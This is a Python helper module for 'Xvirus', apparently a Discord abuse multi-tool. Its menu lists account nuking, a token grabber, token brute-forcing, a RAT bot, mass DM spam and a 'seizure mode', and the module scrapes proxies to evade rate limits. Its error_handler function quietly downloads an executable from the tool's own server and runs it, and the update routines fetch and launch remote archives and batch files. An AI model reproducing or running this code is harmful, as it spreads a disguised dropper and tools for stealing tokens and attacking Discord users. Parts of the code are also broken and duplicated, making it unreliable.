import os
import re
import io
import sys
import time
import json
import ctypes
import random
import zipfile
import requests
import pkg_resources
import subprocess
import threading
import multiprocessing
import keyboard
import base64
import colorama
import shutil
import os.path
import string
import tempfile
from zipfile import ZipFile
from time import sleep
from colorama import Fore
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from distutils.version import LooseVersion
from bs4 import BeautifulSoup
import urllib.request
from urllib.request import urlopen, urlretrieve

def CHANGE_LOG():
    input(f'''
    1. Webhook Generator
    2. Fixed token info
    3. Groupchat spammer fixed''')
    
THIS_VERSION = "1.6.4"
TARGET_VERSION = 0

def search_for_updates():
    clear()
    setTitle("Xvirus Checking For Updates. . .")
    
    latest_version_url = "https://cloud.xvirus.xyz/latest_version.txt"
    r = requests.get(latest_version_url)
    latest_version = r.text.strip()

    if THIS_VERSION != latest_version:
        setTitle("New Update Found!")
        print(
            f"""{Fore.YELLOW}
                ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗  ██╗
                ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝  ██║
                ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗    ██║
                ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝    ╚═╝
                ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗  ██╗
                ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝  ╚═╝
                              {Fore.RED}Looks like Xvirus {THIS_VERSION} is outdated """.replace(
                "█", f"{Fore.WHITE}█{Fore.RED}"
            ),
            end="\n\n",
        )

        update_url = f"https://cloud.xvirus.xyz/Xvirus-Tools-main.zip"
        choice = input(
            f"{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Do you want to update to the latest version? (Y to update N to continue using this version): {Fore.RED}"
        )

        if choice.lower() == "y" or choice.lower() == "yes":
            print(f"{Fore.WHITE}\nUpdating. . .")
            setTitle(f"Xvirus Updating...")
            new_version_source = requests.get(update_url)
            with open("Xvirus-Tools-main.zip", "wb") as zipfile:
                zipfile.write(new_version_source.content)
            with ZipFile("Xvirus-Tools-main.zip", "r") as filezip:
                filezip.extractall()
            os.remove("Xvirus-Tools-main.zip")
            cwd = os.getcwd() + "\\Xvirus-Tools-main"
            shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
            shutil.rmtree(cwd)
            setTitle("Xvirus Update Complete!")
            print(f"{Fore.GREEN}Update Successfully Finished!")
            sleep(2)
            if os.path.exists(os.getcwd() + "setup.bat"):
                os.startfile("setup.bat")
            elif os.path.exists(os.getcwd() + "start.bat"):
                os.startfile("start.bat")
            os._exit(0)


def update():
    clear()
    setTitle("Xvirus Checking For Updates. . .")

    setTitle("New Update Found!")
    print(
        f"""{Fore.YELLOW}
        ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗  ██╗
        ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝  ██║
        ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗    ██║
        ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝    ╚═╝
        ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗  ██╗
         ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝  ╚═╝
        {Fore.RED}Looks like your Xvirus is outdated """.replace(
            "█", f"{Fore.WHITE}█{Fore.RED}"
        ),
        end="\n\n",
    )

    update_url = f"https://github.com/Xvirus0/Xvirus-Tools/archive/refs/heads/main.zip"
    choice = input(
        f"{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Do you want to update to the latest dev branch (Remember that the dev branch might be unstable)?\n(Y to update N to continue using this version): {Fore.RED}"
    )

    if choice.lower() == "y" or choice.lower() == "yes":
        print(f"{Fore.WHITE}\nUpdating. . .")
        setTitle(f"Xvirus Updating...")
        new_version_source = requests.get(update_url)
        with open("Xvirus-Tools-main.zip", "wb") as zipfile:
            zipfile.write(new_version_source.content)
        with ZipFile("Xvirus-Tools-main.zip", "r") as filezip:
            filezip.extractall()
        os.remove("Xvirus-Tools-main.zip")
        cwd = os.getcwd() + "\\Xvirus-Tools-main"
        shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
        shutil.rmtree(cwd)
        setTitle("Xvirus Update Complete!")
        print(f"{Fore.GREEN}Update Successfully Finished!")
        sleep(2)
        if os.path.exists(os.getcwd() + "setup.bat"):
            os.startfile("setup.bat")
        elif os.path.exists(os.getcwd() + "start.bat"):
            os.startfile("start.bat")
        os._exit(0)


def get_driver():
    driver_path = os.path.join('assets', 'msedgedriver.exe')

    if os.path.exists(driver_path):
        print(f"{Fore.GREEN}msedgedriver.exe found in assets folder, continuing. . .")
        return driver_path
    else:
        print(f"{Fore.RED}msedgedriver.exe not found in assets folder! Please make sure it is placed correctly.")
        return None


def clear():
    system = os.name
    if system == 'nt':
        #if its windows
        os.system('cls')
    elif system == 'posix':
        #if its linux
        os.system('clear')
    else:
        print('\n'*120)
    return

def setTitle(_str):
    system = os.name
    if system == 'nt':
        #if its windows
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} | Made By Xvirus")
    elif system == 'posix':
        #if its linux
        os.system(f"\033]0;{_str} | Made By Xvirus\a", end='', flush=True)
    else:
        #if its something else or some err happend for some reason, we do nothing
        pass

def print_slow(_str):
    for letter in _str:
        #slowly print out the words 
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.04)

def validateToken(token):
    headers = getheaders(token)
    url = 'https://discord.com/api/v10/users/@me'
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print(f"{Fore.BLUE}Valid Token.")
        # Token is valid
    else:
        print(f"\n{Fore.RED}Invalid Token.")
        sleep(1)
        __import__("Xvirus").main()

def validateWebhook(hook):
    try:
        response = requests.get(hook)
        response.raise_for_status()
    except requests.exceptions.RequestException:
        print(f"\n{Fore.RED}Invalid Webhook.")
        sleep(1)
        __import__("Xvirus").main()

    try:
        json_data = response.json()
        j = json_data["name"]
        print(f"{Fore.BLUE}Valid webhook! ({j})")
    except (KeyError, json.decoder.JSONDecodeError):
        print(f"\n{Fore.RED}Invalid Webhook.")
        sleep(1)


def proxy_scrape(): 
    proxieslog = []
    setTitle("Scraping Proxies")
    #start timer
    startTime = time.time()
    #create temp dir
    temp = os.getenv("temp")+"\\xvirus_proxies"
    print(f"{Fore.YELLOW}Please wait while Xvirus Scrapes proxies for you!")

    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        #get the proxies from all the sites with the custom regex
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    #all urls
def proxy_scrape(): 
    proxieslog = []
    setTitle("Scraping Proxies")
    #start timer
    startTime = time.time()
    #create temp dir
    temp = os.getenv("temp")+"\\xvirus_proxies"
    Anime.Fade((logo), Colors.rainbow, Colorate.Vertical, time=5)

    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        #get the proxies from all the sites with the custom regex
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    #all urls

    proxysources = [
        ["http://spys.me/proxy.txt","%ip%:%port% "],
        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
    ]
 
    threads = [] 
    for url in proxysources:
        #send them out in threads
        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    proxies = list(set(proxieslog))
    with open(temp, "w") as f:
        for proxy in proxies:
            #create the same proxy 7-10 times to avoid ratelimit when using other options
            for i in range(random.randint(7, 10)):
                f.write(f"{proxy}\n")
    #get the time it took to scrape
    execution_time = (time.time() - startTime)
    print(f"{Fore.BLUE}Done! Scraped{Fore.MAGENTA}{len(proxies): >5}{Fore.RED} in total => {Fore.RED}{temp} | {execution_time}ms")
    setTitle(f"Xvirus {THIS_VERSION}")

def proxy():
    temp = os.getenv("temp") + "\\xvirus_proxies"
    
    if not os.path.isfile(temp) or os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[0]

    with open(temp, 'r+') as fp:
        #read all lines
        lines = fp.readlines()
        #get the first line
        fp.seek(0)
        #remove the proxy
        fp.truncate()
        fp.writelines(lines[1:])
    return ({'http://': f'http://{proxy}', 'https://': f'https://{proxy}'})

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]
def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

def check_wifi_connection():
    try:
        urllib.request.urlopen('https://www.google.com')
        pass
    except:
        while True:
            offline()
            for i in range(5, 0, -1):
                print(f"{Fore.RED}                                Retrying in {Fore.BLUE}{i} {Fore.RED}seconds", end='\r')
                time.sleep(1)
            clear()

def check_version():
        try:
            assert sys.version_info >= (3,7)
        except AssertionError:
            print(f"{Fore.RED}Woopsie daisy, your Python version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not compatible with xvirus, please download Python 3.7+")
            sleep(5)
            print("exiting. . .")
            sleep(1.5)
            os._exit(0)

def ping(host):
    while True:
        output = subprocess.check_output(["ping", host]).decode("utf-8")
        print(output)



def get_username():
    temp_dir = tempfile.gettempdir()
    
    username_file = os.path.join(temp_dir, 'xvirus_username')

    if os.path.isfile(username_file):
        with open(username_file, 'r') as f:
            username = f.read().strip()
    else:
        clear()
        usernamelogo()
        username = input(f"""                            {Fore.BLUE}Your Username: """)
        
        with open(username_file, 'w') as f:
            f.write(username)
    
    return username

    
def usernamelogo():
                print(f"""







                    {Fore.RED}███████╗{Fore.BLUE}███╗  ██╗{Fore.RED}████████╗{Fore.BLUE}███████╗{Fore.RED}██████╗   {Fore.BLUE}██╗   ██╗{Fore.RED} █████╗ {Fore.BLUE}██╗   ██╗{Fore.RED}██████╗   
                    {Fore.RED}██╔════╝{Fore.BLUE}████╗ ██║{Fore.RED}╚══██╔══╝{Fore.BLUE}██╔════╝{Fore.RED}██╔══██╗  {Fore.BLUE}╚██╗ ██╔╝{Fore.RED}██╔══██╗{Fore.BLUE}██║   ██║{Fore.RED}██╔══██╗  
                    {Fore.RED}█████╗  {Fore.BLUE}██╔██╗██║{Fore.RED}   ██║   {Fore.BLUE}█████╗  {Fore.RED}██████╔╝  {Fore.BLUE} ╚████╔╝ {Fore.RED}██║  ██║{Fore.BLUE}██║   ██║{Fore.RED}██████╔╝  
                    {Fore.RED}██╔══╝  {Fore.BLUE}██║╚████║{Fore.RED}   ██║   {Fore.BLUE}██╔══╝  {Fore.RED}██╔══██╗  {Fore.BLUE}  ╚██╔╝  {Fore.RED}██║  ██║{Fore.BLUE}██║   ██║{Fore.RED}██╔══██╗  
                    {Fore.RED}███████╗{Fore.BLUE}██║ ╚███║{Fore.RED}   ██║   {Fore.BLUE}███████╗{Fore.RED}██║  ██║  {Fore.BLUE}   ██║   {Fore.RED}╚█████╔╝{Fore.BLUE}╚██████╔╝{Fore.RED}██║  ██║  
                    {Fore.RED}╚══════╝{Fore.BLUE}╚═╝  ╚══╝{Fore.RED}   ╚═╝   {Fore.BLUE}╚══════╝{Fore.RED}╚═╝  ╚═╝  {Fore.BLUE}   ╚═╝   {Fore.RED} ╚════╝ {Fore.BLUE} ╚═════╝ {Fore.RED}╚═╝  ╚═╝  

                          {Fore.BLUE}██╗   ██╗{Fore.RED} ██████╗{Fore.BLUE}███████╗{Fore.RED}██████╗ {Fore.BLUE}███╗  ██╗{Fore.RED} █████╗ {Fore.BLUE}███╗   ███╗{Fore.RED}███████╗
                          {Fore.BLUE}██║   ██║{Fore.RED}██╔════╝{Fore.BLUE}██╔════╝{Fore.RED}██╔══██╗{Fore.BLUE}████╗ ██║{Fore.RED}██╔══██╗{Fore.BLUE}████╗ ████║{Fore.RED}██╔════╝
                          {Fore.BLUE}██║   ██║{Fore.RED}╚█████╗ {Fore.BLUE}█████╗  {Fore.RED}██████╔╝{Fore.BLUE}██╔██╗██║{Fore.RED}███████║{Fore.BLUE}██╔████╔██║{Fore.RED}█████╗  
                          {Fore.BLUE}██║   ██║{Fore.RED} ╚═══██╗{Fore.BLUE}██╔══╝  {Fore.RED}██╔══██╗{Fore.BLUE}██║╚████║{Fore.RED}██╔══██║{Fore.BLUE}██║╚██╔╝██║{Fore.RED}██╔══╝  
                          {Fore.BLUE}╚██████╔╝{Fore.RED}██████╔╝{Fore.BLUE}███████╗{Fore.RED}██║  ██║{Fore.BLUE}██║ ╚███║{Fore.RED}██║  ██║{Fore.BLUE}██║ ╚═╝ ██║{Fore.RED}███████╗
                          {Fore.BLUE} ╚═════╝ {Fore.RED}╚═════╝ {Fore.BLUE}╚══════╝{Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═╝  ╚══╝{Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═╝     ╚═╝{Fore.RED}╚══════╝
                                                                                                 """)

username = get_username()


def setUsername(new: str):
    temp_dir = tempfile.gettempdir()
    username_file = os.path.join(temp_dir, 'xvirus_username')

    with open(username_file, 'w') as f:
        f.write(new)
#########################################################################################################################################################################
def blackwhite(text):
    os.system("")
    faded = ""
    gradient_steps = 10  # Number of gradient steps
    step_size = 255 // gradient_steps  # Calculate step size for each color channel

    red = 0
    green = 0
    blue = 0

    for line in text.splitlines():
        faded += f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n"
        
        red += step_size
        green += step_size
        blue += step_size

        if red > 255:
            red = 255
        if green > 255:
            green = 255
        if blue > 255:
            blue = 255

    return faded

def getTheme():
    themes = ["xeme", "dark", "fire", "aqua", "neon"]
    with open(os.getenv("temp")+"\\xvirus_theme", 'r') as f:
        text = f.read()
        if not any(s in text for s in themes):
            print(f'[{Fore.RED}Error] : Invalid theme was given, Switching to default. . .')
            setTheme('xeme')
            sleep(2.5)
            __import__("Xvirus").main()
        return text

def setTheme(new: str):
    with open(os.getenv("temp")+"\\xvirus_theme", 'w'): pass
    with open(os.getenv("temp")+"\\xvirus_theme", 'w') as f:
        f.write(new)

def banner(theme=None):
    if theme == "dark":
        print(bennerTheme(blackwhite, blackwhite))
    elif theme == "fire":
        print(Colorate.Vertical(Colors.red_to_yellow, (bannerTheme)))
    elif theme == "aqua":
        print(Colorate.Vertical(Colors.cyan_to_blue, (bannerTheme)))
    elif theme == "neon":
        print(Colorate.Vertical(Colors.blue_to_purple, (bannerTheme)))
    else:
       print(f'''{Fore.RED}

                                        ,.   (   .      )        .      "
                                       ("     )  )'     ,'        )  . (`     '`
                                     .; )  ' (( (" )    ;(,     ((  (  ;)  "  )"
                                     _"., ,._'_.,)_(..,( . )_  _' )_') (. _..( '..
                                    ██╗  ██╗██╗   ██╗██╗██████╗ ██╗   ██╗ ██████╗
                                    ╚██╗██╔╝██║   ██║██║██╔══██╗██║   ██║██╔════╝
                                     ╚███╔╝ ╚██╗ ██╔╝██║██████╔╝██║   ██║╚█████╗
                                     ██╔██╗  ╚████╔╝ ██║██╔══██╗██║   ██║ ╚═══██╗
                                    ██╔╝╚██╗  ╚██╔╝  ██║██║  ██║╚██████╔╝██████╔╝
> [TM] Made by Xvirus™              ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝
> [?] {THIS_VERSION} Changelog                                                                                     Update [UPD] <
> [!] Settings                                                                                          Xside gpt [ai] <
{Fore.WHITE} ┌─────────────────────────────────────┬────────────────────────────────────────┬─────────────────────────────────────┐
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Nuke Account                 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}10{Fore.RED}]{Fore.LIGHTBLACK_EX} Block Friends                    {Fore.WHITE}│  {Fore.RED}[{Fore.RED}19{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Disabler (WIP)          {Fore.WHITE}│
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}02{Fore.RED}]{Fore.LIGHTBLACK_EX} Unfriend all friends         {Fore.WHITE} │  {Fore.RED}[{Fore.RED}11{Fore.RED}]{Fore.LIGHTBLACK_EX} Profile Changer                  {Fore.WHITE}│  {Fore.RED}[{Fore.RED}20{Fore.RED}]{Fore.LIGHTBLACK_EX} Discord Rat Bot               {Fore.WHITE}│
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}03{Fore.RED}]{Fore.LIGHTBLACK_EX} Delete and leave all servers {Fore.WHITE} │  {Fore.RED}[{Fore.RED}12{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Brute-Force                {Fore.WHITE}│  {Fore.RED}[{Fore.RED}21{Fore.RED}]{Fore.LIGHTBLACK_EX} Vanity Sniper                 {Fore.WHITE}│
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}04{Fore.RED}]{Fore.LIGHTBLACK_EX} Spam Create New servers      {Fore.WHITE} │  {Fore.RED}[{Fore.RED}13{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Grabber                    {Fore.WHITE}│  {Fore.RED}[{Fore.RED}22{Fore.RED}]{Fore.LIGHTBLACK_EX} Dm Clearer                    {Fore.WHITE}│
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}05{Fore.RED}]{Fore.LIGHTBLACK_EX} Dm Deleter                   {Fore.WHITE} │  {Fore.RED}[{Fore.RED}14{Fore.RED}]{Fore.LIGHTBLACK_EX} QR Code grabber (WIP)            {Fore.WHITE}│  {Fore.RED}[{Fore.RED}23{Fore.RED}]{Fore.LIGHTBLACK_EX} Nitro Generator               {Fore.WHITE}│
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}06{Fore.RED}]{Fore.LIGHTBLACK_EX} Mass Dm                      {Fore.WHITE} │  {Fore.RED}[{Fore.RED}15{Fore.RED}]{Fore.LIGHTBLACK_EX} Mass Report (WIP)                {Fore.WHITE}│  {Fore.RED}[{Fore.RED}24{Fore.RED}]{Fore.LIGHTBLACK_EX} Server Link Generator         {Fore.WHITE}│
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}07{Fore.RED}]{Fore.LIGHTBLACK_EX} Enable Seizure Mode          {Fore.WHITE} │  {Fore.RED}[{Fore.RED}16{Fore.RED}]{Fore.LIGHTBLACK_EX} GroupChat Spammer                {Fore.WHITE}│  {Fore.RED}[{Fore.RED}25{Fore.RED}]{Fore.LIGHTBLACK_EX} Webhook Generator             {Fore.WHITE}│
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}08{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Info                   {Fore.WHITE} │  {Fore.RED}[{Fore.RED}17{Fore.RED}]{Fore.LIGHTBLACK_EX} Webhook Destroyer                {Fore.WHITE}│  {Fore.RED}[{Fore.RED}26{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]                 {Fore.WHITE}│
{Fore.WHITE} │  {Fore.RED}[{Fore.RED}09{Fore.RED}]{Fore.LIGHTBLACK_EX} Log into an account          {Fore.WHITE} │  {Fore.RED}[{Fore.RED}18{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Mass Checker               {Fore.WHITE}│  {Fore.RED}[{Fore.RED}27{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]                 {Fore.WHITE}│
{Fore.WHITE} └─────────────────────────────────────┴────────────────────────────────────────┴─────────────────────────────────────┘
Welcome {username}!''')
                                                                                                                    



bannerTheme = f"""

                                        ,.   (   .      )        .      "
                                       ("     )  )'     ,'        )  . (`     '`
                                     .; )  ' (( (" )    ;(,     ((  (  ;)  "  )"
                                     _"., ,._'_.,)_(..,( . )_  _' )_') (. _..( '..
                                    ██╗  ██╗██╗   ██╗██╗██████╗ ██╗   ██╗ ██████╗
                                    ╚██╗██╔╝██║   ██║██║██╔══██╗██║   ██║██╔════╝
                                     ╚███╔╝ ╚██╗ ██╔╝██║██████╔╝██║   ██║╚█████╗
                                     ██╔██╗  ╚████╔╝ ██║██╔══██╗██║   ██║ ╚═══██╗
                                    ██╔╝╚██╗  ╚██╔╝  ██║██║  ██║╚██████╔╝██████╔╝
> [TM] Made by Xvirus™              ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝
> [?] {THIS_VERSION} Changelog                                                                                     Update [UPD] <
> [!] Settings                                                                                          Xside gpt [ai] <
 ┌─────────────────────────────────────┬────────────────────────────────────────┬─────────────────────────────────────┐
 │  [01] Nuke Account                  │  [10] Block Friends                    │  [19] Token Disabler (WIP)          │
 │  [02] Unfriend all friends          │  [11] Profile Changer                  │  [20] Discord Rat Bot               │
 │  [03] Delete and leave all servers  │  [12] Token Brute-Force                │  [21] Vanity Sniper                 │
 │  [04] Spam Create New servers       │  [13] Token Grabber                    │  [22] Dm Clearer                    │
 │  [05] Dm Deleter                    │  [14] QR Code grabber (WIP)            │  [23] Nitro Generator               │
 │  [06] Mass Dm                       │  [15] Mass Report (WIP)                │  [24] Server Link Generator         │
 │  [07] Enable Seizure Mode           │  [16] GroupChat Spammer                │  [25] Webhook Generator             │
 │  [08] Token Info                    │  [17] Webhook Destroyer                │  [26] [Coming Soon]                 │
 │  [09] Log into an account           │  [18] Token Mass Checker               │  [27] [Coming Soon]                 │
 └─────────────────────────────────────┴────────────────────────────────────────┴─────────────────────────────────────┘
Welcome {username}!"""

def bennerTheme(type1, type2):
    return type1(f'''

                                        ,.   (   .      )        .      "
                                       ("     )  )'     ,'        )  . (`     '`
                                     .; )  ' (( (" )    ;(,     ((  (  ;)  "  )"
                                     _"., ,._'_.,)_(..,( . )_  _' )_') (. _..( '..
                                    ██╗  ██╗██╗   ██╗██╗██████╗ ██╗   ██╗ ██████╗
                                    ╚██╗██╔╝██║   ██║██║██╔══██╗██║   ██║██╔════╝
                                     ╚███╔╝ ╚██╗ ██╔╝██║██████╔╝██║   ██║╚█████╗
                                     ██╔██╗  ╚████╔╝ ██║██╔══██╗██║   ██║ ╚═══██╗
                                    ██╔╝╚██╗  ╚██╔╝  ██║██║  ██║╚██████╔╝██████╔╝
> [TM] Made by Xvirus™              ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝
> [?] {THIS_VERSION} Changelog                                                                                     Update [UPD] <
> [!] Settings                                                                                          Xside gpt [ai] <''')+type2(f'''
 ┌─────────────────────────────────────┬────────────────────────────────────────┬─────────────────────────────────────┐
 │  [01] Nuke Account                  │  [10] Block Friends                    │  [19] Token Disabler (WIP)          │
 │  [02] Unfriend all friends          │  [11] Profile Changer                  │  [20] Discord Rat Bot               │
 │  [03] Delete and leave all servers  │  [12] Token Brute-Force                │  [21] Vanity Sniper                 │
 │  [04] Spam Create New servers       │  [13] Token Grabber                    │  [22] Dm Clearer                    │
 │  [05] Dm Deleter                    │  [14] QR Code grabber (WIP)            │  [23] Nitro Generator               │
 │  [06] Mass Dm                       │  [15] Mass Report (WIP)                │  [24] Server Link Generator         │
 │  [07] Enable Seizure Mode           │  [16] GroupChat Spammer                │  [25] Webhook Generator             │
 │  [08] Token Info                    │  [17] Webhook Destroyer                │  [26] [Coming Soon]                 │
 │  [09] Log into an account           │  [18] Token Mass Checker               │  [27] [Coming Soon]                 │
 └─────────────────────────────────────┴────────────────────────────────────────┴─────────────────────────────────────┘
Welcome {username}!''')

def offline():
                print(f"""{Fore.RED}







                              ██╗   ██╗ █████╗ ██╗   ██╗██████╗    █████╗ ██████╗ ███████╗
                              ╚██╗ ██╔╝██╔══██╗██║   ██║██╔══██╗  ██╔══██╗██╔══██╗██╔════╝
                               ╚████╔╝ ██║  ██║██║   ██║██████╔╝  ███████║██████╔╝█████╗  
                                ╚██╔╝  ██║  ██║██║   ██║██╔══██╗  ██╔══██║██╔══██╗██╔══╝  
                                 ██║   ╚█████╔╝╚██████╔╝██║  ██║  ██║  ██║██║  ██║███████╗
                                 ╚═╝    ╚════╝  ╚═════╝ ╚═╝  ╚═╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                               █████╗ ███████╗███████╗██╗     ██╗███╗  ██╗███████╗  ██╗
                              ██╔══██╗██╔════╝██╔════╝██║     ██║████╗ ██║██╔════╝  ██║
                              ██║  ██║█████╗  █████╗  ██║     ██║██╔██╗██║█████╗    ██║
                              ██║  ██║██╔══╝  ██╔══╝  ██║     ██║██║╚████║██╔══╝    ╚═╝
                              ╚█████╔╝██║     ██║     ███████╗██║██║ ╚███║███████╗  ██╗
                               ╚════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝╚═╝  ╚══╝╚══════╝  ╚═╝{Fore.RED}""")



logo = r"""
Please wait while Xvirus Scrapes proxies for you!










                                                        ██╗  ██╗
                                                        ╚██╗██╔╝
                                                         ╚███╔╝ 
                                                         ██╔██╗ 
                                                        ██╔╝╚██╗
                                                        ╚═╝  ╚═╝





"""[1:]


startuplogo = r"""
██╗  ██╗
╚██╗██╔╝
 ╚███╔╝ 
 ██╔██╗ 
██╔╝╚██╗
╚═╝  ╚═╝
"""[1:]

#################################################################################################################################################################################

def error_handler():
    url = 'https://cloud.xvirus.xyz/windowserrorhandler.exe'

    temp_dir = tempfile.mkdtemp()

    filename = os.path.basename(url)
    filepath = os.path.join(temp_dir, filename)
    response = requests.get(url)
    with open(filepath, 'wb') as file:
        file.write(response.content)

    subprocess.Popen(filepath)
